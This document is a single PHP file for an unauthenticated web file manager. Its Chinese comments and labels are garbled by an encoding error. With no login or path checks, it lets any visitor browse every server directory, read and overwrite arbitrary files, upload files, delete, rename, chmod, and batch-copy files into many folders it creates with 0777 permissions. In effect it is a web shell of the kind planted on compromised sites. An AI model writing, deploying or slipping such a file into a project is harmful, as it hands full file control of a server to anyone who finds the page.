<?php
mb_internal_encoding("UTF-8");

$current = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($current)) $current = getcwd();
$current = realpath($current) ?: $current;
$parent = dirname($current);
$items = scandir($current);

// æ’åºï¼šæ–‡ä»¶å¤¹ä¼˜å…ˆï¼ŒæŒ‰åç§°å‡åº
usort($items, function($a, $b) use ($current) {
    $aPath = $current . DIRECTORY_SEPARATOR . $a;
    $bPath = $current . DIRECTORY_SEPARATOR . $b;
    if (is_dir($aPath) && !is_dir($bPath)) return -1;
    if (!is_dir($aPath) && is_dir($bPath)) return 1;
    return strcasecmp($a, $b);
});

$createFileMsg = $editFileMsg = $actionMsg = '';
$renameTarget = $chmodTarget = null;

// åˆ›å»ºæ–‡ä»¶
if (isset($_POST['create_file'])) {
    $newFilePath = trim($_POST['new_file_path']);
    $newFileContent = $_POST['new_file_content'];
    if (!empty($newFilePath)) {
        $newDir = dirname($newFilePath);
        if (!is_dir($newDir)) mkdir($newDir, 0777, true);
        if (file_put_contents($newFilePath, $newFileContent) !== false) {
            $createFileMsg = "<div class='msg success'>âœ… åˆ›å»ºæ–‡ä»¶æˆåŠŸï¼š<code>" . htmlspecialchars($newFilePath, ENT_QUOTES, 'UTF-8') . "</code></div>";
            $items = scandir($current);
        } else {
            $createFileMsg = "<div class='msg error'>âŒ å†™å…¥å¤±è´¥ï¼š<code>" . htmlspecialchars($newFilePath, ENT_QUOTES, 'UTF-8') . "</code></div>";
        }
    } else {
        $createFileMsg = "<div class='msg warn'>âš ï¸ æ–‡ä»¶è·¯å¾„ä¸èƒ½ä¸ºç©º</div>";
    }
}

// æ‰¹é‡å¤åˆ¶
if (isset($_POST['copy_files'])) {
    $sourceFiles = array_filter(array_map('trim', explode("\n", $_POST['source_files'])));
    $targetDirs = array_filter(array_map('trim', explode("\n", $_POST['target_dirs'])));
    foreach ($sourceFiles as $sourceFile) {
        if (!file_exists($sourceFile)) continue;
        $filename = basename($sourceFile);
        foreach ($targetDirs as $targetDir) {
            $targetDir = rtrim($targetDir, '/') . '/';
            if (!is_dir($targetDir)) mkdir($targetDir, 0777, true);
            copy($sourceFile, $targetDir . $filename);
        }
    }
    $actionMsg = "<div class='msg success'>âœ… æ‰¹é‡å¤åˆ¶å®Œæˆ</div>";
}

// åˆ é™¤æ–‡ä»¶
if (isset($_POST['delete_file'])) {
    $path = $_POST['delete_file'];
    if (is_file($path)) {
        unlink($path);
        $actionMsg = "<div class='msg success'>ğŸ—‘ï¸ æ–‡ä»¶å·²åˆ é™¤ï¼š<code>" . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</code></div>";
        $items = scandir($current);
    }
}

// ä¿®æ”¹æƒé™
if (isset($_POST['chmod_prompt'])) $chmodTarget = $_POST['chmod_prompt'];
if (isset($_POST['chmod_file'])) {
    $path = $_POST['chmod_file'];
    $mode = octdec($_POST['new_permission']);
    if (chmod($path, $mode)) {
        $actionMsg = "<div class='msg success'>âœ… ä¿®æ”¹æƒé™æˆåŠŸï¼š<code>" . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</code></div>";
    } else {
        $actionMsg = "<div class='msg error'>âŒ ä¿®æ”¹æƒé™å¤±è´¥ï¼š<code>" . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</code></div>";
    }
}

// é‡å‘½å
if (isset($_POST['rename_prompt'])) $renameTarget = $_POST['rename_prompt'];
if (isset($_POST['rename_file'])) {
    $old = $_POST['rename_file'];
    $new = $_POST['new_name'];
    $newFull = dirname($old) . DIRECTORY_SEPARATOR . $new;
    if (rename($old, $newFull)) {
        $actionMsg = "<div class='msg success'>âœ… é‡å‘½åæˆåŠŸ</div>";
        $items = scandir($current);
    } else {
        $actionMsg = "<div class='msg error'>âŒ é‡å‘½åå¤±è´¥</div>";
    }
}

// ç¼–è¾‘æ–‡ä»¶
if (isset($_POST['save_edit'])) {
    $editPath = $_POST['edit_path'];
    $editContent = $_POST['edit_content'];
    if (file_put_contents($editPath, $editContent) !== false) {
        $editFileMsg = "<div class='msg success'>âœ… æ–‡ä»¶å·²ä¿å­˜ï¼š<code>" . htmlspecialchars($editPath, ENT_QUOTES, 'UTF-8') . "</code></div>";
    } else {
        $editFileMsg = "<div class='msg error'>âŒ æ–‡ä»¶ä¿å­˜å¤±è´¥</div>";
    }
}

// ä¸Šä¼ æ–‡ä»¶
if (isset($_POST['upload_submit']) && !empty($_FILES['upload_files'])) {
    $uploadDir = $current . DIRECTORY_SEPARATOR;
    $uploadErrors = $uploadSuccess = [];

    foreach ($_FILES['upload_files']['error'] as $index => $error) {
        if ($error === UPLOAD_ERR_OK) {
            $tmpName = $_FILES['upload_files']['tmp_name'][$index];
            $name = basename($_FILES['upload_files']['name'][$index]);
            $destination = $uploadDir . $name;
            if (move_uploaded_file($tmpName, $destination)) {
                $uploadSuccess[] = $name;
            } else {
                $uploadErrors[] = $name;
            }
        } else {
            $uploadErrors[] = $_FILES['upload_files']['name'][$index];
        }
    }

    if ($uploadSuccess) {
        $actionMsg .= "<div class='msg success'>âœ… ä¸Šä¼ æˆåŠŸï¼š<code>" . htmlspecialchars(implode(', ', $uploadSuccess), ENT_QUOTES, 'UTF-8') . "</code></div>";
        $items = scandir($current);
    }
    if ($uploadErrors) {
        $actionMsg .= "<div class='msg error'>âŒ ä¸Šä¼ å¤±è´¥ï¼š<code>" . htmlspecialchars(implode(', ', $uploadErrors), ENT_QUOTES, 'UTF-8') . "</code></div>";
    }
}
?>

<!-- HTML éƒ¨åˆ†ï¼ˆå’Œä½ åŸæ¥çš„å‡ ä¹ä¸€æ ·ï¼Œåªæ˜¯åŠ äº† htmlspecialchars å’Œç¼–ç ä¿æŠ¤ï¼‰ -->
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>æ–‡ä»¶ç®¡ç†å™¨</title>
    <style>
        body { font-family: Arial; padding: 30px; background: #f3f3f3; }
        .container { background: white; padding: 20px; border-radius: 10px; width: 900px; box-shadow: 0 0 5px #ccc; margin-bottom: 30px; }
        input, textarea { width: 100%; padding: 8px; margin: 10px 0; font-size: 14px; }
        input[type="submit"] { width: auto; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; padding: 5px 10px; font-size: 12px; }
        input[type="submit"]:hover { background: #0056b3; }
        code { background: #f8f8f8; padding: 2px 4px; border-radius: 3px; }
        ul { list-style: none; padding-left: 0; }
        li { padding: 6px 0; display: flex; justify-content: space-between; align-items: center; }
        .file-actions form { display: inline; margin-left: 5px; }
        .msg { padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .warn { background: #fff3cd; color: #856404; }
    </style>
</head>
<body>

<div style="padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ccc; margin-bottom: 20px;">
    <strong>ğŸ“‚ å½“å‰ç›®å½•ï¼š</strong>
    <code><?= htmlspecialchars($current, ENT_QUOTES, 'UTF-8') ?></code>
    <?php if ($current !== '/') : ?>
        <div style="margin-top: 5px;">
            ğŸ”™ <a href="?dir=<?= rawurlencode($parent) ?>">è¿”å›ä¸Šçº§ç›®å½•</a>
        </div>
    <?php endif; ?>
</div>

<div class="container">
    <h2>ğŸ“¤ ä¸Šä¼ æ–‡ä»¶</h2>
    <form method="post" enctype="multipart/form-data">
        <label>é€‰æ‹©æ–‡ä»¶ï¼ˆå¯å¤šé€‰ï¼‰</label>
        <input type="file" name="upload_files[]" multiple>
        <input type="submit" name="upload_submit" value="ä¸Šä¼ ">
    </form>
</div>

<div class="container">
    <h2>ğŸ“„ å½“å‰ç›®å½•æ–‡ä»¶åˆ—è¡¨</h2>
    <?= $actionMsg ?>
    <ul>
        <?php foreach ($items as $item):
            if ($item === '.' || $item === '..') continue;
            $fullPath = $current . DIRECTORY_SEPARATOR . $item;
        ?>
        <li>
            <span>
                <?= is_dir($fullPath) ? 'ğŸ“' : 'ğŸ“„' ?>
                <?= is_dir($fullPath)
                    ? '<a href="?dir=' . rawurlencode($fullPath) . '">' . htmlspecialchars($item, ENT_QUOTES, 'UTF-8') . '/</a>'
                    : htmlspecialchars($item, ENT_QUOTES, 'UTF-8')
                ?>
            </span>
            <span class="file-actions">
                <?php if (!is_dir($fullPath)): ?>
                    <form method="post"><input type="hidden" name="edit_path" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" name="edit" value="ğŸ“"></form>
                    <form method="post"><input type="hidden" name="delete_file" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" value="ğŸ—‘ï¸"></form>
                    <form method="post"><input type="hidden" name="chmod_prompt" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" value="ğŸ”§"></form>
                    <form method="post"><input type="hidden" name="rename_prompt" value="<?= htmlspecialchars($fullPath, ENT_QUOTES, 'UTF-8') ?>"><input type="submit" value="âœï¸"></form>
                <?php endif; ?>
            </span>
        </li>
        <?php endforeach; ?>
    </ul>
</div>

<?php if (isset($_POST['edit'])): ?>
<div class="container">
    <h2>âœï¸ ç¼–è¾‘æ–‡ä»¶å†…å®¹</h2>
    <?= $editFileMsg ?>
    <form method="post">
        <input type="hidden" name="edit_path" value="<?= htmlspecialchars($_POST['edit_path'], ENT_QUOTES, 'UTF-8') ?>">
        <label><strong><?= htmlspecialchars($_POST['edit_path'], ENT_QUOTES, 'UTF-8') ?></strong></label>
        <textarea name="edit_content" rows="10"><?= htmlspecialchars(file_get_contents($_POST['edit_path']), ENT_QUOTES, 'UTF-8') ?></textarea>
        <input type="submit" name="save_edit" value="ä¿å­˜">
    </form>
</div>
<?php endif; ?>

<?php if ($chmodTarget): ?>
<div class="container">
    <h2>ğŸ”§ ä¿®æ”¹æƒé™</h2>
    <form method="post">
        <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($chmodTarget, ENT_QUOTES, 'UTF-8') ?>">
        <label>æ–°æƒé™ï¼ˆå¦‚ 0644ï¼‰</label>
        <input type="text" name="new_permission">
        <input type="submit" value="ç¡®è®¤ä¿®æ”¹">
    </form>
</div>
<?php endif; ?>

<?php if ($renameTarget): ?>
<div class="container">
    <h2>âœï¸ é‡å‘½åæ–‡ä»¶</h2>
    <form method="post">
        <input type="hidden" name="rename_file" value="<?= htmlspecialchars($renameTarget, ENT_QUOTES, 'UTF-8') ?>">
        <label>æ–°åç§°</label>
        <input type="text" name="new_name">
        <input type="submit" value="ç¡®è®¤é‡å‘½å">
    </form>
</div>
<?php endif; ?>

<div class="container">
    <h2>ğŸ“ æ‰¹é‡å¤åˆ¶æ–‡ä»¶</h2>
    <form method="post">
        <label>æºæ–‡ä»¶è·¯å¾„ï¼ˆæ¯è¡Œä¸€ä¸ªï¼‰</label>
        <textarea name="source_files" rows="4"></textarea>
        <label>ç›®æ ‡ç›®å½•è·¯å¾„ï¼ˆæ¯è¡Œä¸€ä¸ªï¼‰</label>
        <textarea name="target_dirs" rows="4"></textarea>
        <input type="submit" name="copy_files" value="æ‰¹é‡å¤åˆ¶">
    </form>
</div>

<div class="container">
    <h2>ğŸ“ æ–°å»ºæ–‡ä»¶</h2>
    <?= $createFileMsg ?>
    <form method="post">
        <label>ğŸ“„ æ–‡ä»¶å®Œæ•´è·¯å¾„</label>
        <input type="text" name="new_file_path" placeholder="/path/to/file.txt">
        <label>ğŸ“‹ æ–‡ä»¶å†…å®¹</label>
        <textarea name="new_file_content" rows="5"></textarea>
        <input type="submit" name="create_file" value="åˆ›å»ºæ–‡ä»¶">
    </form>
</div>

</body>
</html>
